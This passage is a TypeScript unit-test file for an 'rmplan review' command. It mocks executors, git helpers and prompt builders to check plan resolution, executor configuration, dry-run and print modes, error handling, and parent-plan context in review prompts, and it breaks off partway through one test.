import { vi, expect, test, beforeEach, afterEach, describe, mock } from 'bun:test';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { ModuleMocker } from '../../testing.js';
import {
  handleReviewCommand,
  buildReviewPrompt,
  detectIssuesInReview,
  buildAutofixPrompt,
  sanitizeBranchName,
  validateFocusAreas,
  resolveReviewTaskScope,
} from './review.js';
import { validateInstructionsFilePath } from '../utils/file_validation.js';
import { generateDiffForReview } from '../incremental_review.js';
import type { PlanSchema } from '../planSchema.js';
import type { PlanWithFilename } from '../utils/hierarchy.js';

const moduleMocker = new ModuleMocker(import.meta);

let testDir: string;

beforeEach(async () => {
  testDir = await mkdtemp(join(tmpdir(), 'rmplan-review-test-'));
  vi.spyOn(console, 'error').mockImplementation(() => {});

  await moduleMocker.mock('../notifications.js', () => ({
    sendNotification: mock(async () => true),
  }));
});

afterEach(() => {
  moduleMocker.clear();
});

test('handleReviewCommand resolves plan by file path', async () => {
  // Create a test plan file
  const planContent = `
id: 1
title: Test Plan
goal: Test the review functionality
details: This is a test plan for the review command
tasks:
  - title: Test task
    description: A test task
    steps:
      - prompt: Do something
        done: false
`;

  const planFile = join(testDir, 'test-plan.yml');
  await writeFile(planFile, planContent);

  // Mock the buildExecutorAndLog and other dependencies
  await moduleMocker.mock('../executors/index.js', () => ({
    buildExecutorAndLog: () => ({
      execute: async () =>
        JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        }),
    }),
    DEFAULT_EXECUTOR: 'codex-cli',
  }));

  await moduleMocker.mock('../configLoader.js', () => ({
    loadEffectiveConfig: async () => ({
      defaultExecutor: 'codex-cli',
    }),
  }));

  await moduleMocker.mock('../../common/git.js', () => ({
    getGitRoot: async () => testDir,
    getTrunkBranch: async () => 'main',
    getUsingJj: async () => false,
  }));

  // Mock the diff generation to return changes
  await moduleMocker.mock('./review.js', () => ({
    handleReviewCommand,
    generateDiffForReview: async () => ({
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    }),
    buildReviewPrompt: (
      planData: any,
      diffResult: any,
      includeDiff: boolean = false,
      useSubagents: boolean = false,
      parentChain: any[] = [],
      completedChildren: any[] = [],
      customInstructions?: string
    ) => 'mock review prompt',
  }));

  // Test resolving plan by file path
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand(planFile, {}, mockCommand);
});

test('handleReviewCommand resolves plan by ID', async () => {
  // Create a test plan file with ID
  const planContent = `
id: 42
title: Test Plan with ID
goal: Test plan resolution by ID
details: This plan should be resolvable by its ID
tasks:
  - title: Test task
    description: A test task
    steps:
      - prompt: Do something
        done: false
`;

  const planFile = join(testDir, 'test-plan-42.yml');
  await writeFile(planFile, planContent);

  // Mock dependencies
  await moduleMocker.mock('../executors/index.js', () => ({
    buildExecutorAndLog: () => ({
      execute: async () =>
        JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        }),
    }),
    DEFAULT_EXECUTOR: 'codex-cli',
  }));

  await moduleMocker.mock('../configLoader.js', () => ({
    loadEffectiveConfig: async () => ({
      defaultExecutor: 'codex-cli',
    }),
  }));

  await moduleMocker.mock('../plans.js', () => ({
    resolvePlanFile: async (planFileOrId: string) => {
      if (planFileOrId === '42') {
        return planFile;
      }
      return planFileOrId;
    },
    readPlanFile: async () => ({
      id: 42,
      title: 'Test Plan with ID',
      goal: 'Test plan resolution by ID',
      details: 'This plan should be resolvable by its ID',
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    }),
  }));

  await moduleMocker.mock('../../common/git.js', () => ({
    getGitRoot: async () => testDir,
    getTrunkBranch: async () => 'main',
    getUsingJj: async () => false,
  }));

  await moduleMocker.mock('./review.js', () => ({
    handleReviewCommand,
    generateDiffForReview: async () => ({
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    }),
    buildReviewPrompt: (
      planData: any,
      diffResult: any,
      includeDiff: boolean = false,
      useSubagents: boolean = false,
      parentChain: any[] = [],
      completedChildren: any[] = [],
      customInstructions?: string
    ) => 'mock review prompt',
  }));

  // Test resolving plan by ID
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand('42', {}, mockCommand);
});

test('uses review default executor from config when no executor option passed', async () => {
  const mockExecutor = {
    execute: mock(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  };

  await moduleMocker.mock('../utils/context_gathering.js', () => ({
    gatherPlanContext: async () => ({
      resolvedPlanFile: 'plan.yml',
      planData: {
        id: 1,
        title: 'Review Executor Test',
        goal: 'Use review default executor',
        tasks: [
          {
            title: 'Task',
            description: 'Review task',
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'diff',
      },
    }),
  }));

  await moduleMocker.mock('../configLoader.js', () => ({
    loadEffectiveConfig: async () => ({
      defaultExecutor: 'codex-cli',
      review: {
        defaultExecutor: 'codex-cli',
      },
    }),
  }));

  await moduleMocker.mock('../executors/index.js', () => ({
    buildExecutorAndLog: (executorName: string) => {
      expect(executorName).toBe('codex-cli');
      return mockExecutor;
    },
    DEFAULT_EXECUTOR: 'codex-cli',
  }));

  await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
    getReviewerPrompt: () => ({
      prompt: 'mock review prompt',
    }),
  }));

  await moduleMocker.mock('../../common/git.js', () => ({
    getGitRoot: async () => testDir,
    getCurrentCommitHash: async () => 'hash',
    getTrunkBranch: async () => 'main',
    getUsingJj: async () => false,
  }));

  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand('plan.yml', { noSave: true }, mockCommand);

  expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
});

describe('generateDiffForReview', () => {
  test('function exists and can be called', async () => {
    // Since mocking the Bun $ utility is complex in tests, we'll test that the function
    // exists and has the expected interface, then test the full functionality in integration tests
    const gitRepoDir = await mkdtemp(join(tmpdir(), 'rmplan-git-test-'));

    // Mock git utilities to avoid actual git calls
    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => false,
    }));

    // Test that the function exists and has the expected structure
    expect(typeof generateDiffForReview).toBe('function');

    // The function should handle the case when git commands fail gracefully
    try {
      await generateDiffForReview(gitRepoDir);
    } catch (error) {
      // Should throw a meaningful error if git commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });

  test('function interface with jj', async () => {
    const jjRepoDir = await mkdtemp(join(tmpdir(), 'rmplan-jj-test-'));

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => true,
    }));

    // Test that the function exists and handles jj mode
    expect(typeof generateDiffForReview).toBe('function');

    try {
      await generateDiffForReview(jjRepoDir);
    } catch (error) {
      // Should throw a meaningful error if jj commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });

  test('incremental mode without history avoids console stdout logging', async () => {
    const gitRepoDir = await mkdtemp(join(tmpdir(), 'rmplan-git-test-'));

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => false,
    }));

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});

    try {
      await generateDiffForReview(gitRepoDir, { incremental: true, planId: '123' });
    } catch (error) {
      expect(error.message).toContain('Failed to generate');
    } finally {
      logSpy.mockRestore();
    }

    expect(logSpy).not.toHaveBeenCalled();
  });
});

describe('buildReviewPrompt', () => {
  test('includes plan context and diff content', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Test Feature Implementation',
      goal: 'Implement a new test feature for the application',
      details: 'This feature should handle user authentication and data validation',
      tasks: [
        {
          title: 'Add authentication',
          description: 'Implement user login/logout functionality',
          done: false,
        },
        {
          title: 'Add data validation',
          description: 'Validate user input',
          done: false,
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/validation.ts'],
      baseBranch: 'main',
      diffContent: `diff --git a/src/auth.ts b/src/auth.ts
index 1234567..abcdefg 100644
--- a/src/auth.ts
+++ b/src/auth.ts
@@ -1,3 +1,6 @@
 export class Auth {
+  login(user: string) {
+    return true;
+  }
 }`,
    };

    // Mock the reviewer prompt
    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        name: 'reviewer',
        description: 'Reviews code',
        prompt: `REVIEWER AGENT\n\n${contextContent}\n\nPLEASE REVIEW THE CODE`,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    // Verify plan context is included
    expect(prompt).toContain('Plan ID:** 42');
    expect(prompt).toContain('Title:** Test Feature Implementation');
    expect(prompt).toContain('Goal:** Implement a new test feature');
    expect(prompt).toContain('Details:**');
    expect(prompt).toContain('This feature should handle user authentication');

    // Verify tasks are included
    expect(prompt).toContain('Tasks:**');
    expect(prompt).toContain('1. **Add authentication**');
    expect(prompt).toContain('Implement user login/logout functionality');
    expect(prompt).toContain('2. **Add data validation**');

    // Verify diff content is included
    expect(prompt).toContain('Base Branch:** main');
    expect(prompt).toContain('Changed Files (2):**');
    expect(prompt).toContain('- src/auth.ts');
    expect(prompt).toContain('- src/validation.ts');
    expect(prompt).toContain('diff --git a/src/auth.ts');
    expect(prompt).toContain('+  login(user: string)');

    // Verify review instructions are included
    expect(prompt).toContain('Review Instructions');
    expect(prompt).toContain('Compliance with Plan Requirements');
    expect(prompt).toContain('Code Quality');
    expect(prompt).toContain('REVIEWER AGENT');
  });

  test('includes review scope note when provided', async () => {
    const planData: PlanSchema = {
      id: 7,
      title: 'Scoped Review Plan',
      goal: 'Check scope note',
      tasks: [{ title: 'Task One', description: 'Only task', done: false }],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      'Scoped to selected tasks.'
    );

    expect(prompt).toContain('**Review Scope:** Scoped to selected tasks.');
  });

  test('passes useSubagents flag to reviewer prompt', async () => {
    const planData: PlanSchema = {
      id: 99,
      title: 'Subagent Plan',
      goal: 'Check subagent usage',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    const reviewerSpy = vi.fn(() => ({ prompt: 'mock prompt' }));
    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: reviewerSpy,
    }));

    buildReviewPrompt(planData, diffResult, false, true, [], []);

    expect(reviewerSpy).toHaveBeenCalledTimes(1);
    expect(reviewerSpy).toHaveBeenCalledWith(
      expect.any(String),
      planData.id,
      undefined,
      undefined,
      true
    );
  });

  test('handles plan without tasks', async () => {
    const planData: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'A simple goal',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/simple.ts'],
      baseBranch: 'main',
      diffContent: 'diff content here',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    expect(prompt).toContain('Plan ID:** 1');
    expect(prompt).toContain('Title:** Simple Plan');
    expect(prompt).toContain('Goal:** A simple goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('src/simple.ts');
  });

  test('handles plan without details', async () => {
    const planData: PlanSchema = {
      id: 2,
      title: 'Plan Without Details',
      goal: 'Test goal',
      tasks: [
        {
          title: 'Task 1',
          description: 'Description 1',
          steps: [],
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'master',
      diffContent: 'test diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    expect(prompt).toContain('Plan ID:** 2');
    expect(prompt).toContain('Title:** Plan Without Details');
    expect(prompt).toContain('Goal:** Test goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('1. **Task 1**');
    expect(prompt).toContain('Description 1');
    expect(prompt).toContain('Base Branch:** master');
  });

  test('uses originalIndex for task numbering when tasks have originalIndex', async () => {
    // Tasks with originalIndex simulate filtered/scoped tasks
    const planData: PlanSchema = {
      id: 10,
      title: 'Scoped Review Plan',
      goal: 'Test original index display',
      tasks: [
        { title: 'Task Two', description: 'Second task', done: false, originalIndex: 2 } as any,
        { title: 'Task Five', description: 'Fifth task', done: true, originalIndex: 5 } as any,
      ],
    };

    const diffResult: DiffResult = {
      diffContent: 'test diff',
      changedFiles: ['file1.ts'],
      baseBranch: 'main',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, false, false, [], []);

    // Should use original indexes (2 and 5), not array indexes (1 and 2)
    expect(prompt).toContain('2. **Task Two**');
    expect(prompt).toContain('5. **Task Five**');
    expect(prompt).not.toContain('1. **Task Two**');
    expect(prompt).not.toContain('2. **Task Five**');
  });
});

describe('handleReviewCommand error handling', () => {
  test('throws error when plan cannot be loaded', async () => {
    const invalidPlanFile = join(testDir, 'invalid.yml');

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => {
        throw new Error('Plan file not found: ' + invalidPlanFile);
      },
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(invalidPlanFile, {}, mockCommand)).rejects.toThrow(
      'Plan file not found'
    );
  });

  test('exits early when no changes detected', async () => {
    const planFile = join(testDir, 'no-changes.yml');

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: false,
          changedFiles: [],
          baseBranch: 'main',
          diffContent: '',
        },
        incrementalSummary: null,
        noChangesDetected: true,
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Should complete without error but not call executor
    await expect(handleReviewCommand(planFile, {}, mockCommand)).resolves.toBeUndefined();
  });

  test('handles executor execution failure', async () => {
    const planFile = join(testDir, 'executor-fail.yml');

    const mockExecutor = {
      execute: mock(async () => {
        throw new Error('Executor failed');
      }),
    };

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'codex-cli',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
      getCurrentCommitHash: async () => 'deadbeef',
    }));

    // Avoid real context gathering that would hit git/FS
    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 126,
          title: 'Test No Issues',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
      'Review execution failed'
    );
  });
});

describe('integration with executor system', () => {
  test('passes correct parameters to executor', async () => {
    const planContent = `
id: 123
title: Integration Test Plan
goal: Test executor integration
tasks:
  - title: Test task
    description: Integration test task
`;
    const planFile = join(testDir, 'integration.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        expect(prompt).toContain('REVIEWER AGENT');
        // expect(metadata.planId).toBe('123');
        expect(metadata.planTitle).toBe('Integration Test Plan');
        // expect(metadata.planFilePath).toBe(planFile);
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 123,
        title: 'Integration Test Plan',
        goal: 'Test executor integration',
        tasks: [
          {
            title: 'Test task',
            description: 'Integration test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: (executorName: string, options: any, config: any) => {
        expect(executorName).toBe('claude-code');
        expect(options.baseDir).toBe(testDir);
        return mockExecutor;
      },
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: `REVIEWER AGENT\n\n${contextContent}`,
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff content',
      }),
      buildReviewPrompt,
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { executor: 'claude-code' }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('passes executionMode review to executor for review-only operation', async () => {
    const planContent = `
id: 123
title: Test Review Execution
goal: Test that review command uses review execution mode
tasks:
  - title: Test task
    description: A test task for review execution mode
`;
    const planFile = join(testDir, 'review-execution.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, planInfo: any) => {
        // Verify that executionMode is set to 'review'
        expect(planInfo.executionMode).toBe('review');
        expect(planInfo.planId).toBe('123');
        expect(planInfo.planTitle).toBe('Test Review Execution');
        expect(planInfo.planFilePath).toBe(planFile);
        expect(planInfo.captureOutput).toBe('result');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 123,
        title: 'Test Review Execution',
        goal: 'Test that review command uses review execution mode',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task for review execution mode',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff content',
      }),
      buildReviewPrompt: (
        planData: any,
        diffResult: any,
        includeDiff: boolean = false,
        useSubagents: boolean = false,
        parentChain: any[] = [],
        completedChildren: any[] = [],
        customInstructions?: string
      ) => 'test review prompt',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, {}, mockCommand);

    // Verify the executor was called with correct executionMode
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    // The assertions for executionMode are in the mock function above
    // which will throw if the values don't match expected
  });

  test('respects dry-run option', async () => {
    const planContent = `
id: 1
title: Dry Run Test
goal: Test dry run functionality
tasks:
  - title: Test task
    description: Dry run test task
`;
    const planFile = join(testDir, 'dry-run.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async () => 'Should not be called'),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 1,
        title: 'Dry Run Test',
        goal: 'Test dry run functionality',
        tasks: [
          {
            title: 'Test task',
            description: 'Dry run test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: (
        planData: any,
        diffResult: any,
        includeDiff: boolean = false,
        useSubagents: boolean = false,
        parentChain: any[] = [],
        completedChildren: any[] = [],
        customInstructions?: string
      ) => 'Generated prompt for dry run',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { dryRun: true }, mockCommand);

    // Executor should not be called in dry-run mode
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  test('print mode forces json output without prompting', async () => {
    const planFile = join(testDir, 'print-mode.yml');

    const mockExecutor = {
      execute: mock(async () =>
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'Use consistent formatting.',
              file: 'src/test.ts',
              line: '10',
              suggestion: 'Run the formatter.',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      ),
    };

    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 1,
          title: 'Print Mode Plan',
          goal: 'Test print mode',
          tasks: [
            {
              title: 'Task One',
              description: 'First task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'codex-cli',
        review: {
          autoSave: false,
        },
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
      getCurrentCommitHash: async () => null,
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    const stdoutWrites: string[] = [];

    // Assumption: print mode outputs via log() (not direct stdout writes).
    await moduleMocker.mock('../../logging.js', () => ({
      log: (value: string) => {
        stdoutWrites.push(String(value));
      },
    }));

    await handleReviewCommand(
      planFile,
      {
        print: true,
        format: 'terminal',
        verbosity: 'normal',
        noSave: true,
      },
      mockCommand
    );

    const output = stdoutWrites.join('').trim();
    const jsonStart = output.indexOf('{');
    const jsonEnd = output.lastIndexOf('}');
    if (jsonStart === -1 || jsonEnd === -1 || jsonEnd <= jsonStart) {
      throw new Error(`Expected JSON output, got: ${output}`);
    }
    const parsed = JSON.parse(output.slice(jsonStart, jsonEnd + 1));
    expect(parsed.planId).toBe('1');
    expect(parsed.issues).toHaveLength(1);
  });
});

describe('Parent plan context handling', () => {
  test('includes parent context when plan has a parent', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement a new rmplan review command that analyzes code changes against plan requirements',
      details:
        'The review command will compare the current branch to the trunk branch, gather all relevant plan context',
      tasks: [],
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Plan Integration',
      goal: 'Enhance the review command to intelligently handle plan hierarchies',
      details:
        'Extend the review command to automatically include relevant context from parent plans',
      parent: 99,
      tasks: [
        {
          title: 'Implement parent plan context gathering',
          description:
            'Add logic to detect when a plan has a parent and automatically include parent context',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/rmplan/commands/review.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, [parentPlan], []);

    // Verify parent context is included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Parent Goal:** Implement a new rmplan review command');
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plan above.'
    );

    // Verify child plan context still included
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** PR review command - Parent-Child Plan Integration');
  });

  test('works normally when plan has no parent', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Standalone Plan',
      goal: 'A plan without a parent',
      tasks: [
        {
          title: 'Task 1',
          description: 'A simple task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    // Should not include parent context
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include normal plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 42');
    expect(prompt).toContain('**Title:** Standalone Plan');
  });

  test('continues without parent context when parent plan is missing', async () => {
    // This test ensures the review works even if parent plan cannot be found
    const childPlan: PlanSchema = {
      id: 101,
      title: 'Child Plan',
      goal: 'A child plan with missing parent',
      parent: 99, // Parent ID exists but plan will not be found
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    await moduleMocker.mock('../executors/claude_code/agent_prompts.js', () => ({
      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    // Test with undefined parent (simulating missing parent)
    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, [], []);

    // Should not include parent context when parent is missing
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include child plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** Child Plan');
  });

  test('handles parent plan context integration in handleReviewCommand', async () => {
    const testDir = await mkdtemp(join(tmpdir(), 'rmplan-parent-test-'));

    // Create parent plan file
    const parentPlanContent = `
id: 99
title: Parent Plan
goal: Parent goal for context
details: This is the parent plan providing context
tasks:
  - title: Parent task
    description: A parent task
`;
    const parentPlanFile = join(testDir, 'parent-99.yml');
    await writeFile(parentPlanFile, parentPlanContent);

    // Create child plan file
    const childPlanContent = `
id: 101
title: Child Plan
goal: Child goal that implements parent
parent: 99
tasks:
  - title: Child task
    description: A child task
`;
    const childPlanFile = join(testDir, 'child-101.yml');
    await writeFile(childPlanFile, childPlanContent);

    const mockExecutor = {
      execute: mock(async (prompt: string) => {
        // Verify the prompt includes parent context
        expect(prompt).toContain('# Parent Plan Context');
        expect(prompt).toContain('**Parent Plan ID:** 99');
        expect(prompt).toContain('**Parent Title:** Parent Plan');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async (planFileOrId: string) => {
        if (planFileOrId === childPlanFile) return childPlanFile;
        if (planFileOrId === parentPlanFile) return parentPlanFile;
        if (planFileOrId === '99') return parentPlanFile; // Handle parent ID resolution
        return planFileOrId;
      },
      readPlanFile: async (filePath: string) => {
        if (filePath === parentPlanFile) {
          return {
            id: 99,
            title: 'Parent Plan',
            goal: 'Parent goal for context',
            details: 'This is the parent plan providing context',
